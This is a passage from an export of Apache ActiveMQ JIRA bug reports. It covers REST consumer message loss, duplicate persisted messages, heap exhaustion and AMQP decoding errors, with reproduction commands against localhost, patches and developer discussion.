wget --no-http-keep-alive -q -O - ""http://localhost:8161/api/message/TEST?type=queue&clientId=GETID-1&readTimeout=1000""

# ... but with client ID 2:
wget --no-http-keep-alive -q -O - ""http://localhost:8161/api/message/TEST?type=queue&clientId=GETID-2&readTimeout=1000""
2
{code}

Seems like round-robin still happens even after a client disconnected because of the read timeout. Hope this helps.;;;","12/Jan/14 23:10;artnaseef;That's what I would expect with a prefecth > 0 because even prefetch = 1 means a single message will be dispatched, or pushed, to the client ""proactively"" - i.e. without any call to the receive method.

Let me look at how prefetch works in the REST client.;;;","12/Jan/14 23:34;artnaseef;OK, so bad news - prefetch = 0 leads to web requests that don't appear to timeout.

Prefetch = 1 works as I expected - one of the two clients gets a single message preloaded.  Also tested with prefeth = 2 and it works as expected.;;;","13/Jan/14 20:10;psedi;So each new client ID creates a new subscription, which remains even after the client disconnects or timeouts and will be dispatched messages if prefetch > 0. Tested this with 3 clients (and without readTimeout), and all messages were distributed equally. Nice.

Unfortunatelly, it's still pretty easy to provoke message loss when using an (admitedly unreasonable) low read Timeout. But what may happen, timing-wise, in an artifical test scenario may eventually happen in production even with natural timeouts. And avoiding message loss is paramount, IMHO.

So here's another one:
{code}
#
# start receiving messages in background with readTimeout=1, clientId ""GETID-1""
#
while true; do wget --no-http-keep-alive -q -O - ""http://localhost:8161/api/message/TEST?type=queue&clientId=GETID-1&readTimeout=1""; done&
[1] 6040

#
# send some messages -- output is done by background receiver -- no message loss
#
for ((i=1; i<100; i++)); do curl -d ""body=$i."" http://localhost:8161/api/message/TEST?type=queue; done
1.2.3.4.5.6.7.8.9.10.11.12.13.14.15.16.17.18.19.20.21.22.23.24.25.26.27.28.29.30.31.32.33.34.35.36.37.38.39.40.41.42.43.44.45.46.47.48.49.50.51.52.53.54.55.56.57.58.59.60.61.62.63.64.65.66.67.68.69.70.71.72.73.74.75.76.77.78.79.80.81.82.83.84.85.86.87.88.89.90.91.92.93.94.95.96.97.98.99.

#
# create another subscription with clientId ""GETID-2"" (no messages read)
#
wget --no-http-keep-alive -q -O - ""http://localhost:8161/api/message/TEST?type=queue&clientId=GETID-2&readTimeout=1""

#
# try sending messages again -- expect to see every other message, but lots of message loss
#
for ((i=1; i<100; i++)); do curl -d ""body=$i."" http://localhost:8161/api/message/TEST?type=queue -so /dev/null; done
1.3.7.11.15.23.27.33.39.45.49.53.57.59.61.65.69.75.83.87.89.91.93.97.

# don't forget to stop background job
kill %1
{code}

Maybe it's just some timing issue which just becomes critical when there are two instead of just one subscription. But still, with a server-side timeout, the server should be able to tell if a message was completely delivered to a client or not, despite the timeout.;;;","14/Jan/14 01:37;artnaseef;There are several possible desirable outcomes with REST and JMS.  Unfortunately, they are vastly different in their methodology - REST is based on synchronous request/reply and JMS is based on asynchronous passing of messages to consumers.

Consider load balancing in a scenario mixing REST and JMS clients.  The current model, using prefetch to push messages, provides semantics that are more ""fair"" to the REST client by allowing messages to cache in the internal consumer for that client, just as they do for JMS clients.

With that said, there is no analogous REST scenario for automatically releasing messages when the connection closes because REST always closes the connection after a single message while JMS holds it open indefinitely.

For more advanced use-cases, perhaps camel would be a good tool to intelligently bridge the REST/JMS gap.

BTW, the messages stored in the consumer for REST clients aren't truly lost.  They will sit indefinitely, but once the broker restarts, they will be returned to the broker.  This is actually bad for many reasons since it really means an idle consumer - very bad for JMS in general and activemq in particular.

Perhaps we need a REST call that will force close a consumer, or a REST call that intentionally performs a one-shot message receive (i.e. automatically closes the consumer after the call).  Honestly, I'd prefer to put my effort elsewhere since, as mentioned above, REST for JMS is not a great fit.

Hope this helps.  Let me know your thoughts.;;;","14/Jan/14 04:12;artnaseef;That's a great test case.  There is a race condition when a request takes more than 10ms (the minimum timeout) to complete.  It races with the availability of the message.

I'm working on a fix.;;;","14/Jan/14 17:33;artnaseef;Attaching a more complete patch that:

* eliminates a race condition in which the servlet receives a message during a continuation at the same time the continuation times-out leading to a lost message
* eliminates another race condition in which a client may block longer than necessary when a message arrives immediately after the initial receive call fails to return a message
* prevents concurrent use of a consumer by throwing an exception on a request to use a consumer when that consumer is already active in another request.

There is still a possible message-loss scenario that can't be fixed without a rework of the protocol with the client.  Once the servlet receives the message and attempts to send it back to the client, if the client loses the connection to the server, that message is lost.  The only 100% reliable solution to that is to push message acknowledgement down to the client, which opens more potential issues.;;;","14/Jan/14 20:42;artnaseef;That patch also adds a URL-encoded parameter, oneShot, that when true, will close the consumer on completion of the request.  Like this:

{noformat}
curl --no-keepalive -o message \
	""http://localhost:8161/api/message/TEST?type=queue&clientId=GETID1&readTimeout=1000&oneShot=true""
{noformat};;;","14/Jan/14 21:18;psedi;Thank you for your explanations. I'm content with the prefetch scenario, as long as every message can be reliably consumed using a known set of subscriptions. With the oneShot parameter, semantics are more intuitive though, as there are no lingering subscriptions.

Back to testing: With the second patch, the ""low-timeout multiple receivers"" testcase as well as the original testcase work perfectly. Even with prefetch=0 there is no message loss. With two concurrent receivers and no prefetch, messages are not distributed equally, but that is as expected. ""oneShot"" works, too -- even with multiple aggressively polling receivers.

Great work, thank you very much!
;;;","16/Jan/14 15:20;tabish;Patch applied with some minor code cleanup.  ;;;","17/Jan/14 03:51;artnaseef;Great!  Thanks Timothy.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Download page must not link to snapshots / nightly builds,AMQ-4936,12684704,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Critical,Fixed,,sebb,sebb,14/Dec/13 13:41,11/Apr/16 22:57,14/Jul/23 05:43,11/Apr/16 22:57,,,,,,,,,,,,,0,,,,,,,,,"Nightly builds / snapshots which are not formal releases should not be linked from the main download page.
Such builds have not been voted on and should only be used by developers who should be made aware that the code is without any guarantees.
Nightly builds are not formal ASF releases, and must not be promoted to the general public.
See [1] second para. The second sentence states:
""Do not include any links on the project website that might encourage non-developers to download and use nightly builds, snapshots, release candidates, or any other similar package.""

[1] http://www.apache.org/dev/release.html#what
",http://activemq.apache.org/download.html,sebb,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-6237,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,363776,,,Mon Apr 11 22:57:25 UTC 2016,,,,,,,,,,,"0|i1qpdr:",364082,,,,,,,,,,,,,,,,,,,,,"10/Apr/16 14:49;sebb;PING does anyone read these issues?;;;","11/Apr/16 22:47;sebb;The download page still links to SNAPSHOTS.

These are not formal releases and must not be promoted to non-developers;;;","11/Apr/16 22:57;tabish;Once the site refreshes occurs it will not show up.  ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
JDBCPersistenceAdapter: queue messages trapped in store when DB connection is lost and restored,AMQ-4934,12684248,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,dejanb,dejanb,dejanb,12/Dec/13 13:49,02/Apr/14 22:18,14/Jul/23 05:43,12/Dec/13 13:57,5.9.0,,,,,5.10.0,5.9.1,,,,,,0,,,,,,,,,"Periodically messages are being trapped in the store and not delivered to consumers when the broker (using JDBC Persistence adapter) loses and then restores its connection to the DB.
The issued appears to occur when the connection to the DB is lost while the message is being committed to the DB - the message is committed to the DB but the broker does not know it has been committed as it receives an exception during the commit operation.
When the DB connection is restored the message will NOT be loaded from from the store. The trapped message is NOT added to the Broker JMX statics - it is only seen by querying the DB.
The message will be loaded when the broker is restarted.",,dejanb,donnchadh,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,363320,,,Thu Dec 12 13:57:52 UTC 2013,,,,,,,,,,,"0|i1qmlb:",363626,,,,,,,,,,,,,,,,,,,,,"12/Dec/13 13:57;dejanb;The problem can happen when JDBC driver throw SQLEcxeption after it stores a message in the database. In that case we need to reset the cursor before we restore the transports.

This is now fixed on the trunk;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
java.lang.OutOfMemoryError: Java heap space Exception when sending big amount(1000+) of 1M non persistent messages to broker,AMQ-4930,12684022,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,gtully,gtully,11/Dec/13 12:51,21/May/18 13:20,14/Jul/23 05:43,20/Dec/13 14:47,5.9.0,,,,,5.10.0,5.9.1,,Broker,,,,0,FilePendingMessageCursor,nonPersistent,OOM,,,,,,"missing reference count on filepending message cursor allows unlimited messages to be loaded into the broker.
The periodic messageExpiry task does a forced page in, that does not seem to respect a memory limit, even if it is correctly calculated.
disabling message expiry avoids the issue.
org.apache.activemq.broker.region.policy.PolicyEntry#expireMessagesPeriod=0",,gtully,matteor,paulgale,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-6967,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,363094,,,Wed Mar 12 16:53:34 UTC 2014,,,,,,,,,,,"0|i1ql73:",363400,,,,,,,,,,,,,,,,,,,,,"18/Dec/13 15:53;gtully;fix and test in:
http://git-wip-us.apache.org/repos/asf/activemq/commit/a64976a3;;;","20/Dec/13 13:43;gtully;regression in org.apache.activemq.broker.jmx.MBeanTest - we are not attempting to page in max messages.;;;","20/Dec/13 14:47;gtully;fix for test regression in http://git-wip-us.apache.org/repos/asf/activemq/commit/14d24cca;;;","12/Mar/14 16:53;gtully;additional fix - http://git-wip-us.apache.org/repos/asf/activemq/commit/9c247160;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
remove old and unused org.apache.activemq.broker.BrokerService#setSupportFailOver,AMQ-4929,12684020,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,dejanb,gtully,gtully,11/Dec/13 12:40,14/Apr/15 12:00,14/Jul/23 05:43,14/Apr/15 12:00,5.9.0,,,,,5.12.0,,,Broker,,,,0,,,,,,,,,there is a bunch of duplicate detection in transactionbroker that is disabled by default and not tested that duplicates work done elsewhere - store and producerAutit. It should be removed.,,dejanb,githubbot,gtully,tabish,zmhassan,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,363092,,,Tue Apr 14 12:00:51 UTC 2015,,,,,,,,,,,"0|i1ql6n:",363398,,,,,,,,,,,,,,,,,,,,,"11/Feb/15 23:29;githubbot;GitHub user zmhassan opened a pull request:

    https://github.com/apache/activemq/pull/60

    https://issues.apache.org/jira/browse/AMQ-4929 - remove old and unused org.apache.activemq.broker.BrokerService#setSupportFailOver

    I've removed the unused method `org.apache.activemq.broker.BrokerService#setSupportFailOver`. Thank you for taking the time to review this patch and merging to master.

You can merge this pull request into a Git repository by running:

    $ git pull https://github.com/zmhassan/activemq AMQ-4929-master

Alternatively you can review and apply these changes as the patch at:

    https://github.com/apache/activemq/pull/60.patch

To close this pull request, make a commit to your master/trunk branch
with (at least) the following in the commit message:

    This closes #60
    
----
commit 69312beb1598f9748fb2589a5ba0374a9a99b41f
Author: zmhassan <zak.hassan1010@gmail.com>
Date:   2015-02-11T23:26:26Z

    remove old and unused org.apache.activemq.broker.BrokerService#setSupportFailOver
    13 of 21

----
;;;","11/Feb/15 23:38;tabish;The patch only removes the method, but the issue calls for all the related bits surrounding this option to also be removed.  ;;;","12/Feb/15 02:30;zmhassan;Thank you. I'll rollback and send up a more complete patch. I just was wondering if I should also remove line 2332 in BrokerService.java (Link provided below). There is mention of  transactionbroker being disabled by default in the comment section and I'm not sure but I wanted to know if its safe to remove this line  BrokerService.java#L2332 ?

https://github.com/zmhassan/activemq/blob/trunk/activemq-broker/src/main/java/org/apache/activemq/broker/BrokerService.java#L2332
;;;","14/Apr/15 11:59;githubbot;Github user asfgit closed the pull request at:

    https://github.com/apache/activemq/pull/60
;;;","14/Apr/15 12:00;dejanb;This is now fixed with http://git-wip-us.apache.org/repos/asf/activemq/commit/2852a8bd

The property should have been moved when we removed pure master-slave functionality https://issues.apache.org/jira/browse/AMQ-4165;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
clients can not receive mqtt retained message,AMQ-4927,12683799,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,rajdavies,xbwen,xbwen,10/Dec/13 09:06,07/Jun/14 19:05,14/Jul/23 05:43,10/Dec/13 13:36,,,,,,5.10.0,5.9.1,,,,,,0,,,,,,,,,"I use activemq 5.9.0 as mqtt server, and eclipse paho as the mqtt client package. But the client can not receive the retained message. If I use Apollo, it works fine.

Is it a bug? or I miss some configuration?

Someone else have the same problem, the discussion is here: http://activemq.2283324.n4.nabble.com/Retained-Flag-in-MQTT-td4668333.html",activemq 5.9.0,artnaseef,pcarman,xbwen,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,362871,,,Sat Jun 07 19:05:44 UTC 2014,,,,,,,,,,,"0|i1qjtz:",363177,,,,,,,,,,,,,,,,,,,,,"16/May/14 18:40;pcarman;I'm using 5.9.1 and I still see this issue. It is not resolved.;;;","07/Jun/14 19:05;artnaseef;@Paddy - can you provide evidence this is not fixed on the trunk?  If you do, I'll reopen it.

If it's fixed on the trunk and not on 5.9.1, I'll take ""5.9.1"" out of the fix list.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Duplicate messages are left in the persistence store,AMQ-4924,12683192,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,rajdavies,ron.koerner,ron.koerner,06/Dec/13 19:56,02/Apr/14 22:19,14/Jul/23 05:43,11/Dec/13 11:17,5.8.0,5.9.0,,,,5.10.0,5.9.1,,Broker,,,,0,,,,,,,,,"We have a local and remote broker connected with a duplex bridge, which is initiated by the remote broker.
Producers are attached to the remote broker, one consumer to the local broker.
The following scenario causes messages to be left in the local store, which are replayed when the local broker is restarted:
# messages are forwarded from the remote broker to the local broker
# messages are dispatched to the local consumer
# the connection between the local and remote broker fails
# the local broker tries to acknowledge the message reception to the remote broker, which fails
# the remote broker reconnects
# the messages are resent
# the local broker correctly identifies them as duplicates, but puts them into the store nevertheless where they remain until the local broker is restarted
# other messages are produced and consumed without a problem
# the local broker is restarted
# the duplicates are now delivered to the local consumer again and of course out of order

This behaviour can be identified by a queue size which does not seem to shrink below a certain number, even if a consumer is connected and consuming other messages.

When the log level is set to TRACE these messages indicate the problem:
{code}
2013-12-06 20:35:17,405 TRACE .a.a.b.r.c.AbstractStoreCursor - org.apache.activemq.broker.region.cursors.QueueStorePrefetch@c0bc4f:testqueue,batchResetNeeded=false,storeHasMessages=true,size=0,cacheEnabled=true,maxBatchSize:1 - cursor got duplicate: ID:smcexp5-58011-1386358514283-7:1:1:1:1, 4 [ActiveMQ VMTransport: vm://LOCAL#19-1]
2013-12-06 20:35:17,412 TRACE .a.a.b.r.c.AbstractStoreCursor - org.apache.activemq.broker.region.cursors.QueueStorePrefetch@c0bc4f:testqueue,batchResetNeeded=false,storeHasMessages=false,size=1,cacheEnabled=false,maxBatchSize:1 - fillBatch [ActiveMQ BrokerService[LOCAL] Task-2]
{code}
",,gtully,rajdavies,ron.koerner,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-4952,,,,,,,,,,,,,"06/Dec/13 20:16;ron.koerner;AMQ4924.java;https://issues.apache.org/jira/secure/attachment/12617465/AMQ4924.java",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,362444,,,Wed Dec 11 14:35:37 UTC 2013,,,,,,,,,,,"0|i1qh5r:",362738,,,,,,,,,,,,,,,,,,,,,"06/Dec/13 20:00;ron.koerner;Attached test case to reproduce the problem. It can be reproduced with KahaDB or LevelDB.;;;","06/Dec/13 20:16;ron.koerner;Attached new version, where the local consumer is disconnected and reconnected to exclude prefetch issues.;;;","11/Dec/13 11:17;rajdavies;Duplicates where not being checked in duplex connections.
There is an additional property on NetworkConnector that needs to be enabled - checkDuplicateMessagesOnDuplex (default is false).

Thank you Ron for investigating this!;;;","11/Dec/13 11:31;ron.koerner;It also seems to help to enable ""supportFailOver"" in the broker.

I don't know about the individual advantages or disadvantages for each solution. Can you elaborate? Is there a reason not to activate supportFailOver or checkDuplicateMessagesOnDuplex permanently/by default?
;;;","11/Dec/13 11:33;ron.koerner;This also seemst to be a duplicate of https://issues.apache.org/jira/browse/AMQ-3473.
Unfortunately setting auditNetworkProducers = true does not suppress the extra message in the store.;;;","11/Dec/13 12:17;ron.koerner;After looking at your change, I wondered if the problem also occurs without a duplex bridge and reran my test. It does happen without duplex. I also may have misunderstood your code, but I was wondering how the remote side could know which messages need to be resent, as sometimes messages could get lost and other times just the response/ack gets lost (like in my case).;;;","11/Dec/13 12:42;gtully;@Ron supportFailOver is really old code that has no tests and I am not aware of any user of it. It duplicates work done elsewhere. So don't go down that road. see: https://issues.apache.org/jira/browse/AMQ-4929;;;","11/Dec/13 12:47;rajdavies;There's another variable to set on the TransportConnector - auditNetworkProducers (disabled by default) - for regular networks. Messages are always available to be resent unless they've been acknowledged as being consumed, so its really only duplicate messages that we need to worry about.;;;","11/Dec/13 14:35;ron.koerner;So if I have no duplex connection I need to activate auditNetworkProducer on the receiving TransportConnector (in my case ""LOCAL"") and if I have a duplex connection I need to activate checkDuplicateMessagesOnDuplex on the sending NetworkConnector (in my case ""REMOTE"").
But when messages are sent from REMOTE to LOCAL the DemandForwardingBridge on the LOCAL side will actually check for the duplicate, even if it is configured only on the REMOTE side.
As soon as 5.10 is released I will change my setup accordingly. For now I can use supportFailOver as a workaround.

Thank you very much!

Other people with this problem may appreciate a hint to use auditNetworkProducers or checkDuplicateMessagesOnDuplex whenever they encounter the situation that there is a duplicate detected by the cursor.
;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Replicated LevelDB: Loss of broker Quorum fails to fully stop the master,AMQ-4923,12682963,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,chirino,chirino,chirino,05/Dec/13 18:17,09/Oct/16 02:41,14/Jul/23 05:43,05/Dec/13 18:40,5.9.0,,,,,5.10.0,5.9.1,,Broker,,,,0,,,,,,,,,"Master keeps reporting:

INFO | The connection to 'tcp://10.64.132.143:55732' is taking a long time to shutdown.",,lnsh,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,362220,,,Sun Oct 09 02:41:14 UTC 2016,,,,,,,,,,,"0|i1qfs7:",362515,,,,,,,,,,,,,,,,,,,,,"05/Dec/13 18:40;chirino;Fixed.;;;","09/Oct/16 02:41;lnsh;Where can I see the resloved code of this issue?
Thank you.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
AmqpErrorException occurs with multiple concurrent amqp topic consumers,AMQ-4920,12682879,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,kearls,kearls,kearls,05/Dec/13 11:11,02/Apr/14 22:15,14/Jul/23 05:43,09/Jan/14 09:42,,,,,,5.10.0,5.9.1,,,,,,0,,,,,,,,,"I'll add a test to reproduce this.  There are currently 2 problems.  The more frequent one looks like:  org.apache.qpid.amqp_1_0.type.AmqpErrorException
        at org.apache.qpid.amqp_1_0.codec.ValueHandler.readConstructor(ValueHandler.java:99)
        at org.apache.qpid.amqp_1_0.codec.ValueHandler.parse(ValueHandler.java:90)
        at org.apache.qpid.amqp_1_0.codec.ValueHandler.readConstructor(ValueHandler.java:105)
        at org.apache.qpid.amqp_1_0.codec.ValueHandler.parse(ValueHandler.java:90)

… repeated many times
at org.apache.qpid.amqp_1_0.codec.ValueHandler.readConstructor(ValueHandler.java:105)
        at org.apache.qpid.amqp_1_0.codec.ValueHandler.parse(ValueHandler.java:90)
        at org.apache.qpid.amqp_1_0.messaging.SectionDecoderImpl.parseAll(SectionDecoderImpl.java:49)
        at org.apache.qpid.amqp_1_0.client.Receiver.receive(Receiver.java:280)
        at org.apache.qpid.amqp_1_0.jms.impl.MessageConsumerImpl.receive0(MessageConsumerImpl.java:286)
        at org.apache.qpid.amqp_1_0.jms.impl.MessageConsumerImpl.receiveImpl(MessageConsumerImpl.java:255)
        at org.apache.qpid.amqp_1_0.jms.impl.MessageConsumerImpl.receive(MessageConsumerImpl.java:238)
        at org.apache.qpid.amqp_1_0.jms.impl.MessageConsumerImpl.receive(MessageConsumerImpl.java:56)
        at org.apache.activemq.transport.amqp.ENTMQ466ConsumerThread.run(ENTMQ466Test.java:123)

This occurs at the line ""final EncodedMessage amqp = outboundTransformer.transform(jms);"" in the ConsumerContext.pumpOutbound() method of AmqpProtocolConverter(). This call sometimes returns with its content (amqp.getArray()) set to all zeros. 

On those messages this line
LOG.info(""In pumpOutbound, setting currentBuffer to offset {} length {} content [{}]"", amqp.getArrayOffset(), amqp.getLength(), amqp.getArray());
returns:

2013-11-26 17:19:16,680 [calhost] Task-3] - INFO AmqpProtocolConverter - In pumpOutbound, setting currentBuffer to offset 0 length 162 content [[0, 0, 0, 0, 0, \
0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,\
0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0\
, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]]

At the root of this, outboundTransformer is a (proton) AutoOutboundTransformer.  It calls AMQPNativeOutboundTransformer.transform(), which calls msg.readBytes(data), which sometimes writes all 0s to data.  Here msg is an ActiveMQBytesMessage.  

",,gurilubana,kearls,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"17/Dec/13 09:10;kearls;rp.out;https://issues.apache.org/jira/secure/attachment/12619062/rp.out",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,362136,,,Tue Apr 01 17:51:27 UTC 2014,,,,,,,,,,,"0|i1qf9j:",362431,,,,,,,,,,,,,,,,,,,,,"10/Dec/13 20:33;tabish;My guess would be that the message is getting dispatched to two different transports at the same time and the amqp transport code that modifies headers and read the message body causes one to read the message while its in an invalid state.  

I made this change and now I can't reproduce the problem, still requires further investigation though to confirm that this is what's really happening.  

{code}
                    org.apache.activemq.command.Message message = null;
                    if (md.getMessage() != null) {
                        message = md.getMessage().copy();
                        if (!message.getProperties().containsKey(MESSAGE_FORMAT_KEY)) {
                            message.setProperty(MESSAGE_FORMAT_KEY, 0);
                        }
                    }
                    final ActiveMQMessage jms = (ActiveMQMessage) message;
{code};;;","11/Dec/13 09:02;kearls;Hi Tim.  I applied your change, but AMQ4920Test still fails.  Did you change anything else?;;;","11/Dec/13 11:12;tabish;It could still fail here since this really isn't synchronized.  I did also have the BytesMessage losing contents patch applied at the time as well.  ;;;","13/Dec/13 16:53;tabish;Kevin, can you test using the following patch and see if your test still fails.  

{noformat}
diff --git a/activemq-amqp/src/main/java/org/apache/activemq/transport/amqp/AmqpProtocolConverter.java b/activemq-amqp/src/main/java/org/apache/activemq/transport/amqp/AmqpProtocolConverter.java
index 893fa1b..06a4aa9 100644
--- a/activemq-amqp/src/main/java/org/apache/activemq/transport/amqp/AmqpProtocolConverter.java
+++ b/activemq-amqp/src/main/java/org/apache/activemq/transport/amqp/AmqpProtocolConverter.java
@@ -1134,7 +1137,7 @@
             consumerInfo.setNoRangeAcks(true);
             consumerInfo.setDestination(dest);
             consumerInfo.setPrefetchSize(100);
-            consumerInfo.setDispatchAsync(true);
+            consumerInfo.setDispatchAsync(false);
             if (source.getDistributionMode() == COPY && dest.isQueue()) {
                 consumerInfo.setBrowser(true);
             }
{noformat};;;","13/Dec/13 17:50;kearls;Sorry, still failing.  It looks like it's better, as now AMQ4920Test sometimes finishes, but most of the time it still fails.
;;;","13/Dec/13 19:32;tabish;Do you have the fix for AMQ-4887 applied to your codebase right now, I've been unable to reproduce this issue after that fix plus changing the async dispatch flag to false.  ;;;","15/Dec/13 18:23;kearls;I have that installed, and AMQ4920Test is still failing for me.  I'll double check tomorrow and make sure I'm running all of the right code.
;;;","16/Dec/13 19:38;tabish;Updated the test to fix a timing issue that could cause it to fail erroneously.  Maybe retry the async dispatch fix again to see if this was the failure you were seeing.  ;;;","17/Dec/13 09:09;kearls;Sorry, it's still failing for me.  I'll attach a log where I ran the test 50 times and got 16 failures.  After each failure I grepped for error messages, most of which look like:

2013-12-17 09:50:36,657 [pool-1-thread-4] - ERROR AMQ4930ConsumerTask            - consumer Consumer-3 expected 291 got message [topic]
or 
2013-12-17 09:49:32,429 [pool-1-thread-3] - ERROR AMQ4930ConsumerTask            - consumer Consumer-2 expected 646 got message [topic://AMQ4920Test1387270164946]
;;;","17/Dec/13 09:10;kearls;Log from 50 iterations of AMQ4920Test
